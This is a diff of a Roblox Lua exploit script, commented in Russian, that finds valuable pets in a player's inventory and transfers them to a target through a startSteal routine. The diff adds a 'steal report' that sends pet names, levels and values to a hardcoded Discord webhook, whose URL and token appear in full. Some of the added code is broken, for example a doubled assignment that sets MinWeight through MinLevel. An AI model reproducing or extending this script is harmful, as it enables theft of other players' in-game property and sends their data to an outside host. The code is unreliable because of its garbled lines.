@@ -5,42 +5,80 @@ end
 
 
 getgenv().PetConfig = {
-    MinLevel = 25,           -- минимальный возраст
-    MinWeight = 5.0,         -- минимальный вес
+    MinLevel = getgenv().MinLevel = 25,           -- минимальный возраст
+    MinWeight = getgenv().MinLevel = 5.0,         -- минимальный вес
     GrowthFactor = 0.1       -- формула роста веса: BaseWeight × (1 + Level × GrowthFactor)
 }
 
 getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
 
 
+-- 🔁 Храним начальный список UID петов
+local originalPetUIDs = {}
+local reportSent = false
+
+for petUid, _ in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+    originalPetUIDs[petUid] = true
+end
+
+-- 🔁 Проверка — пропал ли питомец из инвентаря
+local function checkIfPetTransferred()
+    if reportSent then return end
+
+    local currentPets = dataModule:GetData().PetsData.PetInventory.Data
+    for uid in pairs(originalPetUIDs) do
+        if not currentPets[uid] then
+            print("🐾 Pet removed from inventory:", uid)
+            reportSent = true
+            sendStealReportOnce() -- ⬅️ Вот сюда вставится функция из следующего шага
+            break
+        end
+    end
+end
 
 
 
--- 🔔 Отправка вебхука при передаче одного пета
-local function sendPetWebhook(petName, level, weight, value)
-    local webhookUrl = getgenv().Webhook
-    if not webhookUrl then return end
 
-    local request = http_request or request or syn.request
-    if not request then return end
+function sendStealReportOnce()
+    local passedPets = {}
+    local failedPets = {}
+    local totalValue = 0
+    local failedValue = 0
+    local countPassed = 0
+    local countFailed = 0
+    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
 
-    local payload = {
-        username = "✅ Pet Transferred",
-        embeds = {{
-            title = "🐾 Pet Successfully Transferred",
-            color = 3066993,
-            description = string.format("Pet: **%s**\nLevel: **%d**\nWeight: **%.2f KG**\nValue: **%d**", petName, level, weight, value),
-            footer = { text = os.date("Transferred at %H:%M:%S") }
-        }}
-    }
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        local petData = value.PetData
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local realWeight = baseWeight * (1 + level * growthFactor)
+        local petPrice = PET_VALUES[petName] or 0
 
-    pcall(function()
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = game:GetService("HttpService"):JSONEncode(payload)
-        })
+        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
+
+        if checkPetsWhitelist(petName, petData) then
+            table.insert(passedPets, line)
+            totalValue += petPrice
+            countPassed += 1
+        else
+            table.insert(failedPets, line)
+            failedValue += petPrice
+            countFailed += 1
+        end
+    end
+
+    local summary = string.format(
+        "**✅ Passed:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
+        countPassed, totalValue, countFailed, failedValue
+    )
+
+    local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
+                        "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
+
+    createDiscordEmbed(fullPetList, summary, "", function()
+        print("📨 Отчёт отправлен один раз.")
     end)
 end
 
@@ -570,28 +608,17 @@ for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         end
 
         local function checkPetsInventory(target)
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(value.PetType, value.PetData) then continue end
+            for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+                if not checkPetsWhitelist(value.PetType) then continue end
 
-        local petObject = getPetObject(petUid)
-        if not petObject then continue end
+                local petObject = getPetObject(petUid)
+                if not petObject then continue end
 
-        equipPet(petObject)
-        task.wait(0.2)
-        startSteal(target)
-
-        -- 📤 Отправка вебхука после передачи
-        local petName = value.PetType
-        local petData = value.PetData
-        local level = petData.Level or 0
-        local baseWeight = petData.BaseWeight or 0
-        local weight = baseWeight * (1 + level * 0.1)
-        local price = PET_VALUES[petName] or 0
-
-        sendPetWebhook(petName, level, weight, price)
-    end
-end
-
+                equipPet(petObject)
+                task.wait(0.2)
+                startSteal(target)
+            end
+        end
 
         local function idlingTarget()
             task.spawn(function()
@@ -612,6 +639,13 @@ end
                         lastTarget = nil
                         targetEnterTime = 0
                     end
+                task.spawn(function()
+                while not reportSent do
+                    checkIfPetTransferred()
+                    task.wait(1)
+    end
+end)
+
                 end
             end)
         end
